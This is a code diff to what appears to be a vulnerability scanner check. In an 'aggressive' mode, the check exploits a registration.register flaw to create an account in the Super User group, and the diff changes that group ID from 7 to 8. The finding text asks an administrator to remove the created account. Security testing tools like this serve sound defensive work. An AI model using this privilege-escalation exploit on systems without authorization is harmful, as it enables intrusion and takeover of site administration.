@@ -43,7 +43,8 @@ def check(
     if exploit_mode != "aggressive":
         finding.detail += " Privileged account creation is mutating and is available only in aggressive mode."
         return finding
-    proof = submit_registration(target_url, group=7, timeout=timeout, proxy=proxy)
+    super_user_group = 8
+    proof = submit_registration(target_url, group=super_user_group, timeout=timeout, proxy=proxy)
     finding.exploit_ran = proof["sent"]
     finding.proof_url = proof["proof_url"]
     if not proof["sent"]:
@@ -54,15 +55,15 @@ def check(
         finding.status = "LIKELY_VULNERABLE"
         finding.confidence = "HIGH"
         finding.detail = (
-            "The corrected registration.register request delivered top-level groups[]=7 and persisted a user, "
-            "confirmed by a same-session username/e-mail collision. Group-7 assignment is not externally observable, "
+            "The corrected registration.register request delivered top-level groups[]=8 and persisted a user, "
+            "confirmed by a same-session username/e-mail collision. Group-8 assignment is not externally observable, "
             "so Super User privileges are not claimed as confirmed. "
             f"Disposable candidate: {proof['username']} / {proof['password']} ({proof['email']}); an administrator "
             "must inspect and remove it."
         )
         finding.evidence = {
             "account_created": True,
-            "group_requested": 7,
+            "group_requested": super_user_group,
             "group_field": proof.get("group_field"),
             "privilege_confirmed": False,
             "collision_markers": proof.get("collision_markers", []),
@@ -71,7 +72,7 @@ def check(
         finding.status = "AGGRESSIVE_SENT"
         finding.confidence = "LOW"
         finding.detail = (
-            "The corrected registration.register request with top-level groups[]=7 was sent, but the collision "
+            "The corrected registration.register request with top-level groups[]=8 was sent, but the collision "
             "oracle did not confirm persistence. "
             f"Disposable candidate: {proof['username']} / {proof['password']} ({proof['email']}); collision markers: "
             f"{proof.get('collision_markers', [])}."
